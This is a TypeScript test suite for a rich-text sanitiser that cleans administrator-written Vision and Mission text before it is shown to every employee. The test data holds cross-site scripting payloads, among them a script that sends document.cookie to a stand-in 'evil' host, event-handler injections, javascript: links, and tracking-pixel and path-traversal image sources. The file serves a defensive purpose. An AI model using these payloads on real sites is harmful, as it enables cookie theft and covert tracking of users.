import assert from 'node:assert/strict';
import { describe, it } from 'node:test';

import { plainTextOf, sanitiseRichText } from '../src/organization/rich-text.js';

/**
 * What a company may put on the first screen every one of its employees opens.
 *
 * The Vision and the Mission are written by an administrator and drawn in everybody else's
 * browser. That is the oldest hole in the web, so the question here is not whether the formatting
 * survives — it is whether anything that is not formatting does.
 *
 * The cases below are the ones that catch hand-written sanitisers: the attack that does not look
 * like markup, the handler on a tag nobody thought about, the scheme hidden behind an entity, and
 * the markup that only becomes markup after a browser has repaired it. They are here because this
 * is the file somebody will edit when they want one more tag allowed.
 */
describe('the Vision and Mission are safe to put back on a page', () => {
  describe('what it strips', () => {
    const attacks: readonly { what: string; input: string; mustNotContain: RegExp }[] = [
      {
        what: 'a script tag',
        input: '<p>Our vision</p><script>fetch("//evil/"+document.cookie)</script>',
        mustNotContain: /script|fetch/i,
      },
      {
        what: 'a handler on a broken image',
        input: '<img src=x onerror="alert(document.cookie)">Our vision',
        mustNotContain: /onerror|img/i,
      },
      {
        what: 'a handler on a tag that is allowed',
        input: '<p onclick="alert(1)">Our vision</p>',
        mustNotContain: /onclick/i,
      },
      {
        what: 'a javascript: link',
        input: '<a href="javascript:alert(1)">Our vision</a>',
        mustNotContain: /javascript:|href/i,
      },
      {
        what: 'an svg with a handler',
        input: '<svg><animate onbegin="alert(1)" attributeName="x"></svg>Our vision',
        mustNotContain: /svg|onbegin|animate/i,
      },
      {
        what: 'an iframe',
        input: '<iframe src="//evil"></iframe>Our vision',
        mustNotContain: /iframe/i,
      },
      {
        what: 'a style element',
        input: '<style>body{display:none}</style>Our vision',
        mustNotContain: /<style|display:\s*none/i,
      },
      {
        what: 'a form that posts somewhere',
        input: '<form action="//evil"><input name="p"></form>Our vision',
        mustNotContain: /form|action=/i,
      },
      {
        what: 'a url() in a style attribute, which calls out and reports the reader',
        input: '<span style="background-image:url(//evil/track)">Our vision</span>',
        mustNotContain: /url\(|evil/i,
      },
      {
        what: 'a style that covers the page',
        input:
          '<span style="position:fixed;top:0;left:0;width:100vw;height:100vh">Our vision</span>',
        mustNotContain: /position|100vw/i,
      },
      {
        what: 'a data attribute',
        input: '<p data-payload="x">Our vision</p>',
        mustNotContain: /data-payload/i,
      },
    ];

    for (const attack of attacks) {
      it(`removes ${attack.what}`, () => {
        const cleaned = sanitiseRichText(attack.input);
        assert.ok(cleaned !== null, 'the sentence around it should survive');
        assert.doesNotMatch(cleaned, attack.mustNotContain);
        // The words a person actually wrote are kept: stripping an attack must not also delete
        // the Vision that was wrapped around it.
        assert.match(cleaned, /Our vision/);
      });
    }
  });

  describe('what it keeps', () => {
    it('keeps the formatting the toolbar produces', () => {
      const cleaned = sanitiseRichText(
        '<p><b>Bold</b> and <i>italic</i> and <u>underlined</u></p>' +
          '<ul><li>a bullet</li></ul><ol><li>a number</li></ol>' +
          '<span style="color: #ff0000; font-size: 18px; font-family: Georgia">coloured</span>',
      );

      assert.ok(cleaned !== null);
      for (const kept of [
        '<b>',
        '<i>',
        '<u>',
        '<ul>',
        '<ol>',
        '<li>',
        'color',
        'font-size',
        'font-family',
      ]) {
        assert.ok(
          cleaned.includes(kept),
          `${kept} should have survived — it is what was asked for`,
        );
      }
    });

    it('treats markup with no words in it as nothing set', () => {
      // `<p></p>` would draw an empty panel instead of "No Vision recorded yet."
      assert.equal(sanitiseRichText('<p></p>'), null);
      assert.equal(sanitiseRichText('   '), null);
      assert.equal(sanitiseRichText('<script>alert(1)</script>'), null);
      assert.equal(sanitiseRichText(undefined), null);
      assert.equal(sanitiseRichText(null), null);
    });
  });

  describe('counting the words rather than the markup', () => {
    it('measures what a person wrote, not what they styled', () => {
      const words = 'We will be the safest hospital group in the country.';
      const styled = `<p><span style="color: #112233; font-size: 20px; font-family: Georgia">${words}</span></p>`;

      assert.ok(styled.length > words.length + 60, 'the markup should dominate the byte count');
      assert.equal(plainTextOf(styled).trim(), words);
    });

    it('puts a space where a block ended, so two paragraphs are not one word', () => {
      assert.equal(plainTextOf('<p>first</p><p>second</p>').trim(), 'first second');
      assert.equal(plainTextOf('<li>one</li><li>two</li>').trim(), 'one two');
      assert.equal(plainTextOf('a<br>b').trim(), 'a b');
    });

    it('reads an entity as the character it stands for', () => {
      assert.equal(plainTextOf('Research &amp; Development').trim(), 'Research & Development');
    });
  });
  /*
   * Images, which are allowed only because they point at one place.
   *
   * The client asked to be able to put a picture in the Mission. Allowing `<img>` allows a
   * request from every reader's browser, so the tag is permitted and the destination is not: a
   * `src` anywhere else is a tracking pixel on the first screen every employee opens, reporting
   * who looked and when to whoever owns that host.
   */
  describe('images, and the one place they may come from', () => {
    const ours =
      '/api/tenants/01a0a8fb-8f67-71cb-99f8-f9fdedde810d/organization/company-images/01a10c00-1111-2222-3333-444455556666';

    it('keeps an image uploaded to this company', () => {
      const cleaned = sanitiseRichText(`<p>Our mission</p><img src="${ours}" alt="Our chart">`);
      assert.ok(cleaned !== null);
      assert.match(cleaned, /<img/);
      assert.ok(cleaned.includes(ours), 'the path it was given should survive intact');
      assert.match(cleaned, /alt="Our chart"/);
    });

    const elsewhere: readonly { what: string; src: string }[] = [
      { what: 'a tracking pixel on another host', src: 'https://evil.example/p.gif' },
      { what: 'a protocol-relative host', src: '//evil.example/p.gif' },
      { what: 'a data URI', src: 'data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=' },
      {
        what: 'a path that only looks like ours',
        src: '/api/tenants/x/organization/company-images/y',
      },
      { what: 'our path with something appended', src: `${ours}/../../evil` },
      { what: 'an empty source', src: '' },
    ];

    for (const bad of elsewhere) {
      it(`removes an image from ${bad.what}`, () => {
        const cleaned = sanitiseRichText(`<p>Our mission</p><img src="${bad.src}">`);
        assert.ok(cleaned !== null, 'the sentence should survive');
        assert.doesNotMatch(cleaned, /<img/);
        assert.match(cleaned, /Our mission/);
      });
    }

    it('removes the image rather than leaving a broken one', () => {
      // Stripping the src alone would draw the browser's broken-image icon inside the Mission.
      const cleaned = sanitiseRichText('<p>Our mission</p><img src="https://evil.example/p.gif">');
      assert.ok(cleaned !== null);
      assert.doesNotMatch(cleaned, /img|evil/i);
    });
  });
});
